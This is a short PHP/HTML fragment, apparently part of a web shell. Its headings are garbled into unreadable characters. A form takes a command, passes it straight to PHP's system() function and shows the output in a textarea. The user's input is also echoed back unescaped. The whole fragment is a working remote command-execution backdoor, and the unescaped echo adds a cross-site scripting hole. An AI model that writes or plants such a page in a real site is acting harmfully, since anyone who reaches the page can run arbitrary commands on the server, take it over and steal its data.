	<h1>����ִ��</h1>
	<blockquote>
	<p>����������Ҫִ�е�ϵͳ����</p>
	</blockquote>	
	<form name="myform" action="<?php echo $PHP_SELF ?>" method="post">
	 <div class="input-group input-cmd">
     <input type="text" class="form-control"  placeholder="whoami" name="command" <?php if ($command) { echo "value=\"$command\"";} ?>>
      <span class="input-group-btn">
	  <input name="submit_btn" type="submit"  class="btn btn-primary" value="ִ��">
      </span>
    </div>
	<textarea class="form-control" rows="15" ><?php if ($command) {echo system($command);}?></textarea>
	</form>	